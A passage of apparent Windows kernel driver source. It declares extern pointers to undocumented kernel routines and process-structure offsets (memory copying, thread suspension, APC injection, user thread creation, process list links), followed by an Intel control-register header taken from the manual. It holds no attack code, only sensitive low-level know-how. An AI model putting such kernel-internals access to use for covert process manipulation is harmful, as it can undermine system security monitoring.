  extern function_types::mm_copy_memory_t mm_copy_memory;
  extern function_types::mm_get_virtual_for_physical_t mm_get_virtual_for_physical;
  extern function_types::mm_copy_virtual_memory_t mm_copy_virtual_memory;
  extern function_types::mm_mark_physical_memory_as_bad_t mm_mark_physical_memory_as_bad;
  extern function_types::mm_user_probe_address_t mm_user_probe_address;
  extern function_types::mm_get_system_routine_address_t mm_get_system_routine_address;
  extern function_types::mm_get_physical_memory_ranges_t mm_get_physical_memory_ranges;
  extern function_types::mm_is_address_valid_t mm_is_address_valid;
  extern function_types::mm_allocate_secure_kernel_pages_t mm_allocate_secure_kernel_pages;

  extern uintptr_t mm_highest_physical_page;
  extern uintptr_t mm_lowest_physical_page;

  extern uintptr_t ps_loaded_module_list;
  extern function_types::ps_acquire_process_exit_synchronization_t
      ps_acquire_process_exit_synchronization;
  extern function_types::ps_release_process_exit_synchronization_t
      ps_release_process_exit_synchronization;
  extern function_types::ps_get_process_exit_status_t ps_get_process_exit_status;
  extern function_types::ps_set_create_thread_notify_routine_t ps_set_create_thread_notify_routine;
  extern function_types::ps_set_create_process_notify_routine_ex_t
      ps_set_create_process_notify_routine_ex;
  extern function_types::ps_lookup_process_by_process_id_t ps_lookup_process_by_process_id;
  extern function_types::ps_lookup_thread_by_thread_id_t ps_lookup_thread_by_thread_id;
  extern function_types::ps_get_next_process_thread_t ps_get_next_process_thread;
  extern function_types::ps_suspend_thread_t ps_suspend_thread;
  extern function_types::ps_suspend_thread_t ps_resume_thread;
  extern function_types::ps_query_thread_start_address_t ps_query_thread_start_address;
  extern function_types::ps_get_current_thread_id_t ps_get_current_thread_id;
  extern function_types::ps_get_process_peb_t ps_get_process_peb;
  extern function_types::ps_get_process_image_file_name_t ps_get_process_image_file_name;
  extern function_types::io_get_current_process_t io_get_current_process;
  extern function_types::obf_dereference_object_t obf_dereference_object;

  extern uintptr_t psp_exit_thread;

  extern function_types::ex_allocate_pool2_t ex_allocate_pool2;
  extern function_types::ex_free_pool_with_tag_t ex_free_pool_with_tag;
  extern function_types::ex_get_previous_mode_t ex_get_previous_mode;

  extern uintptr_t ke_balance_set_manager;
  extern function_types::ke_raise_irql_to_dpc_level_t ke_raise_irql_to_dpc_level;
  extern function_types::ke_lower_irql_t ke_lower_irql;
  extern function_types::ke_query_system_time_precise_t ke_query_system_time_precise;
  extern function_types::ke_initialize_apc_t ke_initialize_apc;
  extern function_types::ke_insert_queue_apc_t ke_insert_queue_apc;
  extern function_types::ke_usermode_callback_t ke_usermode_callback;
  extern function_types::ke_alert_thread_t ke_alert_thread;
  extern function_types::ke_delay_execution_thread_t ke_delay_execution_thread;
  extern PLIST_ENTRY ki_process_list_head;
  extern uintptr_t ki_page_fault;
  extern uintptr_t ki_kva_shadow;

  extern function_types::rtl_init_ansi_string_t rtl_init_ansi_string;
  extern function_types::rtl_init_unicode_string_t rtl_init_unicode_string;
  extern function_types::rtl_ansi_string_to_unicode_string_t rtl_ansi_string_to_unicode_string;
  extern function_types::rtl_compare_unicode_string_t rtl_compare_unicode_string;
  extern function_types::rtl_free_unicode_string_t rtl_free_unicode_string;
  extern function_types::rtl_get_version_t rtl_get_version;
  extern function_types::rtl_create_user_thread_t rtl_create_user_thread;

  extern function_types::zw_open_process_t zw_open_process;
  extern function_types::zw_close_t zw_close;
  extern function_types::zw_wait_for_single_object_t zw_wait_for_single_object;
  extern function_types::zw_query_information_process_t zw_query_information_process;
  extern function_types::nt_alert_resume_thread_t nt_alert_resume_thread;

  extern function_types::dbg_print_t dbg_print;

  extern function_types::memcpy_t memcpy;
  extern function_types::memset_t memset;
  extern function_types::memcmp_t memcmp;
  extern function_types::strncmp_t strncmp;
  extern function_types::strlen_t strlen;
  extern function_types::_wcsicmp_t _wcsicmp;
  extern function_types::rand_t rand;
  extern function_types::srand_t srand;
  extern function_types::swprintf_s_t swprintf_s;
  extern function_types::snprintf_t snprintf;
  extern LONG some_dword;
  extern uintptr_t mm_pfn_db;
  extern uintptr_t mm_physical_memory_block;
  extern uintptr_t mi_system_partition;
  extern hyperspace_ctx ctx;

  extern uintptr_t active_process_links;
  extern uintptr_t _eprocess_thread_list_head;
  extern uintptr_t _kprocess_thread_list_head;
  extern uintptr_t _eprocess_shared_commit_links;
  extern uintptr_t _eprocess_shared_commit_charge;
  extern uintptr_t _eprocess_rundown_protect;
  extern uintptr_t _eprocess_vm;
  extern uintptr_t _eprocess_flags3;

  extern uintptr_t _kprocess_dirbase;
  extern uintptr_t _kthread_pkprocess;
  extern uintptr_t _kthread_apcstate_pkprocess;

  extern PEPROCESS proc;
  extern unsigned long build_version;
  extern bool initialized;
}  // namespace globals

#pragma function(memset)
extern void* memset(void* dest, int value, size_t count);

```

`driver/def/ia32.hpp`:

```hpp
/** @file */
#pragma once
typedef unsigned char UINT8;
typedef unsigned short UINT16;
typedef unsigned int UINT32;
typedef unsigned long long UINT64;

#define PAGE_MASK (PAGE_SIZE - 1)

/**
 * @defgroup INTEL_MANUAL \
 *           Intel Manual
 *
 * @remarks All references are based on <b>Intel(R) 64 and IA-32 architectures software developer's
 * manual combined volumes: 1, 2A, 2B, 2C, 2D, 3A, 3B, 3C, 3D, and 4</b> (May 2018).
 * @{
 */
/**
 * @defgroup CONTROL_REGISTERS \
 *           Control registers
 *
 * Control registers (CR0, CR1, CR2, CR3, and CR4) determine operating mode of the processor and the
 * characteristics of the currently executing task. These registers are 32 bits in all 32-bit modes
 * and compatibility mode. In 64-bit mode, control registers are expanded to 64 bits. The MOV CRn
 * instructions are used to manipulate the register bits. Operand-size prefixes for these
 * instructions are ignored. The following is also true:
 * - The control registers can be read and loaded (or modified) using the
 * move-to-or-from-control-registers forms of the MOV instruction. In protected mode, the MOV
 * instructions allow the control registers to be read or loaded (at privilege level 0 only). This
 * restriction means that application programs or operating-system procedures (running at privilege
 * levels 1, 2, or 3) are prevented from reading or loading the control registers.
 * - Bits 63:32 of CR0 and CR4 are reserved and must be written with zeros. Writing a nonzero value
 * to any of the upper 32 bits results in a general-protection exception, \#GP(0).
 * - All 64 bits of CR2 are writable by software.
 * - Bits 51:40 of CR3 are reserved and must be 0.
 * - The MOV CRn instructions do not check that addresses written to CR2 and CR3 are within the
 * linear-address or physical-address limitations of the implementation.
 * - Register CR8 is available in 64-bit mode only. The control registers are summarized below, and
 * each architecturally defined control field in these control registers is described individually.
 * - CR0 - Contains system control flags that control operating mode and states of the processor.
 * - CR1 - Reserved.
 * - CR2 - Contains the page-fault linear address (the linear address that caused a page fault).
 * - CR3 - Contains the physical address of the base of the paging-structure hierarchy and two flags
 * (PCD and PWT). Only the most-significant bits (less the lower 12 bits) of the base address are
 * specified; the lower 12 bits of the address are assumed to be 0. The first paging structure must
 * thus be aligned to a page (4-KByte) boundary. The PCD and PWT flags control caching of that
 * paging structure in the processor's internal data caches (they do not control TLB caching of
 * page-directory information). When using the physical address extension, the CR3 register contains
 * the base address of the page-directorypointer table. In IA-32e mode, the CR3 register contains
 * the base address of the PML4 table.
 * - CR4 - Contains a group of flags that enable several architectural extensions, and indicate
 * operating system or executive support for specific processor capabilities.
 * - CR8 - Provides read and write access to the Task Priority Register (TPR). It specifies the
 * priority threshold value that operating systems use to control the priority class of external
 * interrupts allowed to interrupt the processor. This register is available only in 64-bit mode.
 * However, interrupt filtering continues to apply in compatibility mode.
 *
 * @see Vol3A[2.5(CONTROL REGISTERS)] (reference)
 * @{
 */
typedef union {
  struct {
    /**
     * @brief Protection Enable
     *
     * [Bit 0] Enables protected mode when set; enables real-address mode when clear. This flag does
     * not enable paging directly. It only enables segment-level protection. To enable paging, both
     * the PE and PG flags must be set.
     *
     * @see Vol3A[9.9(Mode Switching)]
     */
    UINT64 ProtectionEnable : 1;
#define CR0_PROTECTION_ENABLE_BIT 0
#define CR0_PROTECTION_ENABLE_FLAG 0x01
#define CR0_PROTECTION_ENABLE_MASK 0x01
#define CR0_PROTECTION_ENABLE(_) (((_) >> 0) & 0x01)

    /**
     * @brief Monitor Coprocessor
     *
     * [Bit 1] Controls the interaction of the WAIT (or FWAIT) instruction with the TS flag (bit 3
     * of CR0). If the MP flag is set, a WAIT instruction generates a device-not-available exception
     * (\#NM) if the TS flag is also set. If the MP flag is clear, the WAIT instruction ignores the
     * setting of the TS flag.
     */
    UINT64 MonitorCoprocessor : 1;
#define CR0_MONITOR_COPROCESSOR_BIT 1
#define CR0_MONITOR_COPROCESSOR_FLAG 0x02
#define CR0_MONITOR_COPROCESSOR_MASK 0x01
#define CR0_MONITOR_COPROCESSOR(_) (((_) >> 1) & 0x01)

    /**
     * @brief FPU Emulation
     *
     * [Bit 2] Indicates that the processor does not have an internal or external x87 FPU when set;
     * indicates an x87 FPU is present when clear. This flag also affects the execution of
     * MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instructions. When the EM flag is set, execution of an x87 FPU
     * instruction generates a device-not-available exception (\#NM). This flag must be set when the
     * processor does not have an internal x87 FPU or is not connected to an external math
     * coprocessor. Setting this flag forces all floating-point instructions to be handled by
     * software emulation. Also, when the EM flag is set, execution of an MMX instruction causes an
     * invalid-opcode exception (\#UD) to be generated. Thus, if an IA-32 or Intel 64 processor
     * incorporates MMX technology, the EM flag must be set to 0 to enable execution of MMX
     * instructions. Similarly for SSE/SSE2/SSE3/SSSE3/SSE4 extensions, when the EM flag is set,
     * execution of most SSE/SSE2/SSE3/SSSE3/SSE4 instructions causes an invalid opcode exception
     * (\#UD) to be generated. If an IA-32 or Intel 64 processor incorporates the
     * SSE/SSE2/SSE3/SSSE3/SSE4 extensions, the EM flag must be set to 0 to enable execution of
     * these extensions. SSE/SSE2/SSE3/SSSE3/SSE4 instructions not affected by the EM flag include:
     * PAUSE, PREFETCHh, SFENCE, LFENCE, MFENCE, MOVNTI, CLFLUSH, CRC32, and POPCNT.
     */
    UINT64 EmulateFpu : 1;
#define CR0_EMULATE_FPU_BIT 2
#define CR0_EMULATE_FPU_FLAG 0x04
#define CR0_EMULATE_FPU_MASK 0x01
#define CR0_EMULATE_FPU(_) (((_) >> 2) & 0x01)

    /**
     * @brief Task Switched
     *
     * [Bit 3] Allows the saving of the x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 context on a task
     * switch to be delayed until an x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instruction is actually
     * executed by the new task. The processor sets this flag on every task switch and tests it when
     * executing x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instructions.
     * - If the TS flag is set and the EM flag (bit 2 of CR0) is clear, a device-not-available
     * exception (\#NM) is raised prior to the execution of any x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4
     * instruction; with the exception of PAUSE, PREFETCHh, SFENCE, LFENCE, MFENCE, MOVNTI, CLFLUSH,
     * CRC32, and POPCNT.
     * - If the TS flag is set and the MP flag (bit 1 of CR0) and EM flag are clear, an \#NM
     * exception is not raised prior to the execution of an x87 FPU WAIT/FWAIT instruction.
     * - If the EM flag is set, the setting of the TS flag has no effect on the execution of x87
     * FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instructions.
     *   The processor does not automatically save the context of the x87 FPU, XMM, and MXCSR
     * registers on a task switch. Instead, it sets the TS flag, which causes the processor to raise
     * an \#NM exception whenever it encounters an x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instruction
     * in the instruction stream for the new task (with the exception of the instructions listed
     * above). The fault handler for the \#NM exception can then be used to clear the TS flag (with
     * the CLTS instruction) and save the context of the x87 FPU, XMM, and MXCSR registers. If the
     * task never encounters an x87 FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 instruction, the x87
     * FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4 context is never saved.
     */
    UINT64 TaskSwitched : 1;
#define CR0_TASK_SWITCHED_BIT 3
#define CR0_TASK_SWITCHED_FLAG 0x08
#define CR0_TASK_SWITCHED_MASK 0x01
#define CR0_TASK_SWITCHED(_) (((_) >> 3) & 0x01)

    /**
     * @brief Extension Type
     *
     * [Bit 4] Reserved in the Pentium 4, Intel Xeon, P6 family, and Pentium processors. In the
     * Pentium 4, Intel Xeon, and P6 family processors, this flag is hardcoded to 1. In the Intel386
     * and Intel486 processors, this flag indicates support of Intel 387 DX math coprocessor
     * instructions when set.
     */
    UINT64 ExtensionType : 1;
#define CR0_EXTENSION_TYPE_BIT 4
#define CR0_EXTENSION_TYPE_FLAG 0x10
#define CR0_EXTENSION_TYPE_MASK 0x01
#define CR0_EXTENSION_TYPE(_) (((_) >> 4) & 0x01)

    /**
     * @brief Numeric Error
     *
     * [Bit 5] Enables the native (internal) mechanism for reporting x87 FPU errors when set;
     * enables the PC-style x87 FPU error reporting mechanism when clear. When the NE flag is clear
     * and the IGNNE\# input is asserted, x87 FPU errors are ignored. When the NE flag is clear and
     * the IGNNE\# input is deasserted, an unmasked x87 FPU error causes the processor to assert the
     * FERR\# pin to generate an external interrupt and to stop instruction execution immediately
     * before executing the next waiting floating-point instruction or WAIT/FWAIT instruction. The
     * FERR\# pin is intended to drive an input to an external interrupt controller (the FERR\# pin
     * emulates the ERROR\# pin of the Intel 287 and Intel 387 DX math coprocessors). The NE flag,
     * IGNNE\# pin, and FERR\# pin are used with external logic to implement PC-style error
     * reporting. Using FERR\# and IGNNE\# to handle floating-point exceptions is deprecated by
     * modern operating systems; this non-native approach also limits newer processors to operate
     * with one logical processor active.
     *
     * @see Vol1[8.7(Handling x87 FPU Exceptions in Software)]
     * @see Vol1[A.1(APPENDIX A | EFLAGS Cross-Reference)]
     */
    UINT64 NumericError : 1;
#define CR0_NUMERIC_ERROR_BIT 5
#define CR0_NUMERIC_ERROR_FLAG 0x20
#define CR0_NUMERIC_ERROR_MASK 0x01
#define CR0_NUMERIC_ERROR(_) (((_) >> 5) & 0x01)
    UINT64 Reserved1 : 10;

    /**
     * @brief Write Protect
     *
     * [Bit 16] When set, inhibits supervisor-level procedures from writing into readonly pages;
     * when clear, allows supervisor-level procedures to write into read-only pages (regardless of
     * the U/S bit setting). This flag facilitates implementation of the copy-onwrite method of
     * creating a new process (forking) used by operating systems such as UNIX.
     *
     * @see Vol3A[4.1.3(Paging-Mode Modifiers)]
     * @see Vol3A[4.6(ACCESS RIGHTS)]
     */
    UINT64 WriteProtect : 1;
#define CR0_WRITE_PROTECT_BIT 16
#define CR0_WRITE_PROTECT_FLAG 0x10000
#define CR0_WRITE_PROTECT_MASK 0x01
#define CR0_WRITE_PROTECT(_) (((_) >> 16) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * @brief Alignment Mask
     *
     * [Bit 18] Enables automatic alignment checking when set; disables alignment checking when
     * clear. Alignment checking is performed only when the AM flag is set, the AC flag in the
     * EFLAGS register is set, CPL is 3, and the processor is operating in either protected or
     * virtual-8086 mode.
     */
    UINT64 AlignmentMask : 1;
#define CR0_ALIGNMENT_MASK_BIT 18
#define CR0_ALIGNMENT_MASK_FLAG 0x40000
#define CR0_ALIGNMENT_MASK_MASK 0x01
#define CR0_ALIGNMENT_MASK(_) (((_) >> 18) & 0x01)
    UINT64 Reserved3 : 10;

    /**
     * @brief Not Write-through
     *
     * [Bit 29] When the NW and CD flags are clear, write-back (for Pentium 4, Intel Xeon, P6
     * family, and Pentium processors) or write-through (for Intel486 processors) is enabled for
     * writes that hit the cache and invalidation cycles are enabled.
     */
    UINT64 NotWriteThrough : 1;
#define CR0_NOT_WRITE_THROUGH_BIT 29
#define CR0_NOT_WRITE_THROUGH_FLAG 0x20000000
#define CR0_NOT_WRITE_THROUGH_MASK 0x01
#define CR0_NOT_WRITE_THROUGH(_) (((_) >> 29) & 0x01)

    /**
     * @brief Cache Disable
     *
     * [Bit 30] When the CD and NW flags are clear, caching of memory locations for the whole of
     * physical memory in the processor's internal (and external) caches is enabled. When the CD
     * flag is set, caching is restricted. To prevent the processor from accessing and updating its
     * caches, the CD flag must be set and the caches must be invalidated so that no cache hits can
     * occur.
     *
     * @see Vol3A[11.5.3(Preventing Caching)]
     * @see Vol3A[11.5(CACHE CONTROL)]
     */
    UINT64 CacheDisable : 1;
#define CR0_CACHE_DISABLE_BIT 30
#define CR0_CACHE_DISABLE_FLAG 0x40000000
#define CR0_CACHE_DISABLE_MASK 0x01
#define CR0_CACHE_DISABLE(_) (((_) >> 30) & 0x01)

    /**
     * @brief Paging Enable
     *
     * [Bit 31] Enables paging when set; disables paging when clear. When paging is disabled, all
     * linear addresses are treated as physical addresses. The PG flag has no effect if the PE flag
     * (bit 0 of register CR0) is not also set; setting the PG flag when the PE flag is clear causes
     * a general-protection exception (\#GP). On Intel 64 processors, enabling and disabling IA-32e
     * mode operation also requires modifying CR0.PG.
     *
     * @see Vol3A[4(PAGING)]
     */
    UINT64 PagingEnable : 1;
#define CR0_PAGING_ENABLE_BIT 31
#define CR0_PAGING_ENABLE_FLAG 0x80000000
#define CR0_PAGING_ENABLE_MASK 0x01
#define CR0_PAGING_ENABLE(_) (((_) >> 31) & 0x01)
    UINT64 Reserved4 : 32;
  };

  UINT64 Flags;
} CR0;

typedef union {
  struct {
    UINT64 Reserved1 : 3;

    /**
     * @brief Page-level Write-Through
     *
     * [Bit 3] Controls the memory type used to access the first paging structure of the current
     * paging-structure hierarchy. This bit is not used if paging is disabled, with PAE paging, or
     * with 4-level paging if CR4.PCIDE=1.
     *
     * @see Vol3A[4.9(PAGING AND MEMORY TYPING)]
     */
    UINT64 PageLevelWriteThrough : 1;
#define CR3_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define CR3_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define CR3_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define CR3_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * @brief Page-level Cache Disable
     *
     * [Bit 4] Controls the memory type used to access the first paging structure of the current
     * paging-structure hierarchy. This bit is not used if paging is disabled, with PAE paging, or
     * with 4-level paging2 if CR4.PCIDE=1.
     *
     * @see Vol3A[4.9(PAGING AND MEMORY TYPING)]
     */
    UINT64 PageLevelCacheDisable : 1;
#define CR3_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define CR3_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define CR3_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define CR3_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)
    UINT64 Reserved2 : 7;

    /**
     * @brief Address of page directory
     *
     * [Bits 47:12] Physical address of the 4-KByte aligned page directory (32-bit paging) or PML4
     * table (64-bit paging) used for linear-address translation.
     *
     * @see Vol3A[4.3(32-BIT PAGING)]
     * @see Vol3A[4.5(4-LEVEL PAGING)]
     */
    UINT64 AddressOfPageDirectory : 36;
#define CR3_ADDRESS_OF_PAGE_DIRECTORY_BIT 12
#define CR3_ADDRESS_OF_PAGE_DIRECTORY_FLAG 0xFFFFFFFFF000
#define CR3_ADDRESS_OF_PAGE_DIRECTORY_MASK 0xFFFFFFFFF
#define CR3_ADDRESS_OF_PAGE_DIRECTORY(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved3 : 16;
  };

  UINT64 Flags;
} CR3;

typedef union {
  struct {
    /**
     * @brief Virtual-8086 Mode Extensions
     *
     * [Bit 0] Enables interrupt- and exception-handling extensions in virtual-8086 mode when set;
     * disables the extensions when clear. Use of the virtual mode extensions can improve the
     * performance of virtual-8086 applications by eliminating the overhead of calling the virtual-
     * 8086 monitor to handle interrupts and exceptions that occur while executing an 8086 program
     * and, instead, redirecting the interrupts and exceptions back to the 8086 program's handlers.
     * It also provides hardware support for a virtual interrupt flag (VIF) to improve reliability
     * of running 8086 programs in multitasking and multiple-processor environments.
     *
     * @see Vol3B[20.3(INTERRUPT AND EXCEPTION HANDLING IN VIRTUAL-8086 MODE)]
     */
    UINT64 VirtualModeExtensions : 1;
#define CR4_VIRTUAL_MODE_EXTENSIONS_BIT 0
#define CR4_VIRTUAL_MODE_EXTENSIONS_FLAG 0x01
#define CR4_VIRTUAL_MODE_EXTENSIONS_MASK 0x01
#define CR4_VIRTUAL_MODE_EXTENSIONS(_) (((_) >> 0) & 0x01)

    /**
     * @brief Protected-Mode Virtual Interrupts
     *
     * [Bit 1] Enables hardware support for a virtual interrupt flag (VIF) in protected mode when
     * set; disables the VIF flag in protected mode when clear.
     *
     * @see Vol3B[20.4(PROTECTED-MODE VIRTUAL INTERRUPTS)]
     */
    UINT64 ProtectedModeVirtualInterrupts : 1;
#define CR4_PROTECTED_MODE_VIRTUAL_INTERRUPTS_BIT 1
#define CR4_PROTECTED_MODE_VIRTUAL_INTERRUPTS_FLAG 0x02
#define CR4_PROTECTED_MODE_VIRTUAL_INTERRUPTS_MASK 0x01
#define CR4_PROTECTED_MODE_VIRTUAL_INTERRUPTS(_) (((_) >> 1) & 0x01)

    /**
     * @brief Time Stamp Disable
     *
     * [Bit 2] Restricts the execution of the RDTSC instruction to procedures running at privilege
     * level 0 when set; allows RDTSC instruction to be executed at any privilege level when clear.
     * This bit also applies to the RDTSCP instruction if supported (if CPUID.80000001H:EDX[27] =
     * 1).
     */
    UINT64 TimestampDisable : 1;
#define CR4_TIMESTAMP_DISABLE_BIT 2
#define CR4_TIMESTAMP_DISABLE_FLAG 0x04
#define CR4_TIMESTAMP_DISABLE_MASK 0x01
#define CR4_TIMESTAMP_DISABLE(_) (((_) >> 2) & 0x01)

    /**
     * @brief Debugging Extensions
     *
     * [Bit 3] References to debug registers DR4 and DR5 cause an undefined opcode (\#UD) exception
     * to be generated when set; when clear, processor aliases references to registers DR4 and DR5
     * for compatibility with software written to run on earlier IA-32 processors.
     *
     * @see Vol3B[17.2.2(Debug Registers DR4 and DR5)]
     */
    UINT64 DebuggingExtensions : 1;
#define CR4_DEBUGGING_EXTENSIONS_BIT 3
#define CR4_DEBUGGING_EXTENSIONS_FLAG 0x08
#define CR4_DEBUGGING_EXTENSIONS_MASK 0x01
#define CR4_DEBUGGING_EXTENSIONS(_) (((_) >> 3) & 0x01)

    /**
     * @brief Page Size Extensions
     *
     * [Bit 4] Enables 4-MByte pages with 32-bit paging when set; restricts 32-bit paging to pages
     * of 4 KBytes when clear.
     *
     * @see Vol3A[4.3(32-BIT PAGING)]
     */
    UINT64 PageSizeExtensions : 1;
#define CR4_PAGE_SIZE_EXTENSIONS_BIT 4
#define CR4_PAGE_SIZE_EXTENSIONS_FLAG 0x10
#define CR4_PAGE_SIZE_EXTENSIONS_MASK 0x01
#define CR4_PAGE_SIZE_EXTENSIONS(_) (((_) >> 4) & 0x01)

    /**
     * @brief Physical Address Extension
     *
     * [Bit 5] When set, enables paging to produce physical addresses with more than 32 bits. When
     * clear, restricts physical addresses to 32 bits. PAE must be set before entering IA-32e mode.
     *
     * @see Vol3A[4(PAGING)]
     */
    UINT64 PhysicalAddressExtension : 1;
#define CR4_PHYSICAL_ADDRESS_EXTENSION_BIT 5
#define CR4_PHYSICAL_ADDRESS_EXTENSION_FLAG 0x20
#define CR4_PHYSICAL_ADDRESS_EXTENSION_MASK 0x01
#define CR4_PHYSICAL_ADDRESS_EXTENSION(_) (((_) >> 5) & 0x01)

    /**
     * @brief Machine-Check Enable
     *
     * [Bit 6] Enables the machine-check exception when set; disables the machine-check exception
     * when clear.
     *
     * @see Vol3B[15(MACHINE-CHECK ARCHITECTURE)]
     */
    UINT64 MachineCheckEnable : 1;
#define CR4_MACHINE_CHECK_ENABLE_BIT 6
#define CR4_MACHINE_CHECK_ENABLE_FLAG 0x40
#define CR4_MACHINE_CHECK_ENABLE_MASK 0x01
#define CR4_MACHINE_CHECK_ENABLE(_) (((_) >> 6) & 0x01)

    /**
     * @brief Page Global Enable
     *
     * [Bit 7] (Introduced in the P6 family processors.) Enables the global page feature when set;
     * disables the global page feature when clear. The global page feature allows frequently used
     * or shared pages to be marked as global to all users (done with the global flag, bit 8, in a
     * page-directory or page-table entry). Global pages are not flushed from the
     * translation-lookaside buffer (TLB) on a task switch or a write to register CR3. When enabling
     * the global page feature, paging must be enabled (by setting the PG flag in control register
     * CR0) before the PGE flag is set. Reversing this sequence may affect program correctness, and
     * processor performance will be impacted.
     *
     * @see Vol3A[4.10(CACHING TRANSLATION INFORMATION)]
     */
    UINT64 PageGlobalEnable : 1;
#define CR4_PAGE_GLOBAL_ENABLE_BIT 7
#define CR4_PAGE_GLOBAL_ENABLE_FLAG 0x80
#define CR4_PAGE_GLOBAL_ENABLE_MASK 0x01
#define CR4_PAGE_GLOBAL_ENABLE(_) (((_) >> 7) & 0x01)

    /**
     * @brief Performance-Monitoring Counter Enable
     *
     * [Bit 8] Enables execution of the RDPMC instruction for programs or procedures running at any
     * protection level when set; RDPMC instruction can be executed only at protection level 0 when
     * clear.
     */
    UINT64 PerformanceMonitoringCounterEnable : 1;
#define CR4_PERFORMANCE_MONITORING_COUNTER_ENABLE_BIT 8
#define CR4_PERFORMANCE_MONITORING_COUNTER_ENABLE_FLAG 0x100
#define CR4_PERFORMANCE_MONITORING_COUNTER_ENABLE_MASK 0x01
#define CR4_PERFORMANCE_MONITORING_COUNTER_ENABLE(_) (((_) >> 8) & 0x01)

    /**
     * @brief Operating System Support for FXSAVE and FXRSTOR instructions
     *
     * [Bit 9] When set, this flag:
     * -# indicates to software that the operating system supports the use of the FXSAVE and FXRSTOR
     * instructions,
     * -# enables the FXSAVE and FXRSTOR instructions to save and restore the contents of the XMM
     * and MXCSR registers along with the contents of the x87 FPU and MMX registers, and
     * -# enables the processor to execute SSE/SSE2/SSE3/SSSE3/SSE4 instructions, with the exception
     * of the PAUSE, PREFETCHh, SFENCE, LFENCE, MFENCE, MOVNTI, CLFLUSH, CRC32, and POPCNT. If this
     * flag is clear, the FXSAVE and FXRSTOR instructions will save and restore the contents of the
     * x87 FPU and MMX registers, but they may not save and restore the contents of the XMM and
     * MXCSR registers. Also, the processor will generate an invalid opcode exception (\#UD) if it
     * attempts to execute any SSE/SSE2/SSE3 instruction, with the exception of PAUSE, PREFETCHh,
     * SFENCE, LFENCE, MFENCE, MOVNTI, CLFLUSH, CRC32, and POPCNT. The operating system or executive
     * must explicitly set this flag.
     *
     * @remarks CPUID feature flag FXSR indicates availability of the FXSAVE/FXRSTOR instructions.
     * The OSFXSR bit provides operating system software with a means of enabling FXSAVE/FXRSTOR to
     * save/restore the contents of the X87 FPU, XMM and MXCSR registers. Consequently OSFXSR bit
     * indicates that the operating system provides context switch support for
     *          SSE/SSE2/SSE3/SSSE3/SSE4.
     */
    UINT64 OsFxsaveFxrstorSupport : 1;
#define CR4_OS_FXSAVE_FXRSTOR_SUPPORT_BIT 9
#define CR4_OS_FXSAVE_FXRSTOR_SUPPORT_FLAG 0x200
#define CR4_OS_FXSAVE_FXRSTOR_SUPPORT_MASK 0x01
#define CR4_OS_FXSAVE_FXRSTOR_SUPPORT(_) (((_) >> 9) & 0x01)

    /**
     * @brief Operating System Support for Unmasked SIMD Floating-Point Exceptions
     *
     * [Bit 10] Operating System Support for Unmasked SIMD Floating-Point Exceptions - When set,
     * indicates that the operating system supports the handling of unmasked SIMD floating-point
     * exceptions through an exception handler that is invoked when a SIMD floating-point exception
     * (\#XM) is generated. SIMD floating-point exceptions are only generated by
     * SSE/SSE2/SSE3/SSE4.1 SIMD floatingpoint instructions.
     * The operating system or executive must explicitly set this flag. If this flag is not set, the
     * processor will generate an invalid opcode exception (\#UD) whenever it detects an unmasked
     * SIMD floating-point exception.
     */
    UINT64 OsXmmExceptionSupport : 1;
#define CR4_OS_XMM_EXCEPTION_SUPPORT_BIT 10
#define CR4_OS_XMM_EXCEPTION_SUPPORT_FLAG 0x400
#define CR4_OS_XMM_EXCEPTION_SUPPORT_MASK 0x01
#define CR4_OS_XMM_EXCEPTION_SUPPORT(_) (((_) >> 10) & 0x01)

    /**
     * @brief User-Mode Instruction Prevention
     *
     * [Bit 11] When set, the following instructions cannot be executed if CPL > 0: SGDT, SIDT,
     * SLDT, SMSW, and STR. An attempt at such execution causes a generalprotection exception
     * (\#GP).
     */
    UINT64 UsermodeInstructionPrevention : 1;
#define CR4_USERMODE_INSTRUCTION_PREVENTION_BIT 11
#define CR4_USERMODE_INSTRUCTION_PREVENTION_FLAG 0x800
#define CR4_USERMODE_INSTRUCTION_PREVENTION_MASK 0x01
#define CR4_USERMODE_INSTRUCTION_PREVENTION(_) (((_) >> 11) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * @brief VMX-Enable
     *
     * [Bit 13] Enables VMX operation when set.
     *
     * @see Vol3C[23(INTRODUCTION TO VIRTUAL MACHINE EXTENSIONS)]
     */
    UINT64 VmxEnable : 1;
#define CR4_VMX_ENABLE_BIT 13
#define CR4_VMX_ENABLE_FLAG 0x2000
#define CR4_VMX_ENABLE_MASK 0x01
#define CR4_VMX_ENABLE(_) (((_) >> 13) & 0x01)

    /**
     * @brief SMX-Enable
     *
     * [Bit 14] Enables SMX operation when set.
     *
     * @see Vol2[6(SAFER MODE EXTENSIONS REFERENCE)]
     */
    UINT64 SmxEnable : 1;
#define CR4_SMX_ENABLE_BIT 14
#define CR4_SMX_ENABLE_FLAG 0x4000
#define CR4_SMX_ENABLE_MASK 0x01
#define CR4_SMX_ENABLE(_) (((_) >> 14) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * @brief FSGSBASE-Enable
     *
     * [Bit 16] Enables the instructions RDFSBASE, RDGSBASE, WRFSBASE, and WRGSBASE.
     */
    UINT64 FsgsbaseEnable : 1;
#define CR4_FSGSBASE_ENABLE_BIT 16
#define CR4_FSGSBASE_ENABLE_FLAG 0x10000
#define CR4_FSGSBASE_ENABLE_MASK 0x01
#define CR4_FSGSBASE_ENABLE(_) (((_) >> 16) & 0x01)

    /**
     * @brief PCID-Enable
     *
